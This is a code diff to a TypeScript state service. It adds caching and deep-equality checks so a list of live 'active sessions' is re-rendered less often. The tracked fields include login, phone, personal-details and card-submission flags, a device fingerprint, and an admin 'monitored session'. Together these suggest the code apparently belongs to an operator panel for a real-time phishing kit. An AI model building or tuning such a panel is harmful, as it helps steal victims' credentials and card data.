@@ -96,6 +96,7 @@ export class StateService {
   // Admin view data
   readonly history = signal<SessionHistory[]>([]); 
   readonly activeSessions = signal<SessionHistory[]>([]); 
+  private sessionCache = new Map<string, SessionHistory>();
 
   // Progress Flags
   readonly isLoginVerified = signal<boolean>(false);
@@ -571,6 +572,22 @@ export class StateService {
       } catch (e) { }
   }
 
+  private areObjectsEqual(obj1: any, obj2: any): boolean {
+      if (obj1 === obj2) return true;
+      if (typeof obj1 !== 'object' || obj1 === null || typeof obj2 !== 'object' || obj2 === null) {
+        return false;
+      }
+      const keys1 = Object.keys(obj1);
+      const keys2 = Object.keys(obj2);
+      if (keys1.length !== keys2.length) return false;
+      for (const key of keys1) {
+        if (!keys2.includes(key) || !this.areObjectsEqual(obj1[key], obj2[key])) {
+          return false;
+        }
+      }
+      return true;
+  }
+
   private processSessionsData(sessions: any[]) {
     if (!Array.isArray(sessions)) return;
 
@@ -578,26 +595,68 @@ export class StateService {
 
     // Active sessions: Not Verified
     const rawActive = sessions.filter((s: any) => s.status !== 'Verified' && s.sessionId !== adminSessionId);
-    const mappedActive: SessionHistory[] = rawActive.map(s => ({
-        id: s.sessionId,
-        timestamp: new Date(s.timestamp || Date.now()),
-        lastSeen: s.lastSeen,
-        email: s.email,
-        name: `${s.firstName || ''} ${s.lastName || ''}`,
-        status: s.status || 'Active',
-        stage: s.stage,
-        fingerprint: s.fingerprint,
-        data: s,
-        resendRequested: s.resendRequested,
-        isLoginVerified: s.isLoginVerified,
-        isPhoneVerified: s.isPhoneVerified,
-        isPersonalVerified: s.isPersonalVerified,
-        isCardSubmitted: s.isCardSubmitted,
-        isFlowComplete: s.isFlowComplete
-    }));
 
-    mappedActive.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
-    this.activeSessions.set(mappedActive);
+    const newActiveSessions: SessionHistory[] = [];
+
+    for (const s of rawActive) {
+        const id = s.sessionId;
+        const cached = this.sessionCache.get(id);
+
+        if (cached && this.areObjectsEqual(cached.data, s)) {
+            newActiveSessions.push(cached);
+        } else {
+            const newSession: SessionHistory = {
+                id: s.sessionId,
+                timestamp: new Date(s.timestamp || Date.now()),
+                lastSeen: s.lastSeen,
+                email: s.email,
+                name: `${s.firstName || ''} ${s.lastName || ''}`,
+                status: s.status || 'Active',
+                stage: s.stage,
+                fingerprint: s.fingerprint,
+                data: s,
+                resendRequested: s.resendRequested,
+                isLoginVerified: s.isLoginVerified,
+                isPhoneVerified: s.isPhoneVerified,
+                isPersonalVerified: s.isPersonalVerified,
+                isCardSubmitted: s.isCardSubmitted,
+                isFlowComplete: s.isFlowComplete
+            };
+            this.sessionCache.set(id, newSession);
+            newActiveSessions.push(newSession);
+        }
+    }
+
+    // Clean up cache
+    if (this.sessionCache.size > newActiveSessions.length) {
+         const currentIds = new Set(newActiveSessions.map(s => s.id));
+         for (const id of this.sessionCache.keys()) {
+             if (!currentIds.has(id)) {
+                 this.sessionCache.delete(id);
+             }
+         }
+    }
+
+    newActiveSessions.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+
+    // Only update signal if effectively different
+    let shouldUpdate = false;
+    const currentList = this.activeSessions();
+
+    if (currentList.length !== newActiveSessions.length) {
+        shouldUpdate = true;
+    } else {
+        for (let i = 0; i < newActiveSessions.length; i++) {
+            if (newActiveSessions[i] !== currentList[i]) {
+                shouldUpdate = true;
+                break;
+            }
+        }
+    }
+
+    if (shouldUpdate) {
+        this.activeSessions.set(newActiveSessions);
+    }
 
     const rawComplete = sessions.filter((s: any) => s.status === 'Verified');
     const mappedHistory: SessionHistory[] = rawComplete.map(s => ({
@@ -628,13 +687,13 @@ export class StateService {
     // Sync Monitored Session View
     if (this.adminAuthenticated()) {
         let targetId = this.monitoredSessionId();
-        if (!targetId && mappedActive.length > 0) {
-              targetId = mappedActive[0].id;
+        if (!targetId && newActiveSessions.length > 0) {
+              targetId = newActiveSessions[0].id;
               this.monitoredSessionId.set(targetId);
         }
         
         if (targetId) {
-            const target = mappedActive.find(s => s.id === targetId);
+            const target = newActiveSessions.find(s => s.id === targetId);
             if (target) {
                 this.updateLocalStateFromRemote(target);
             }
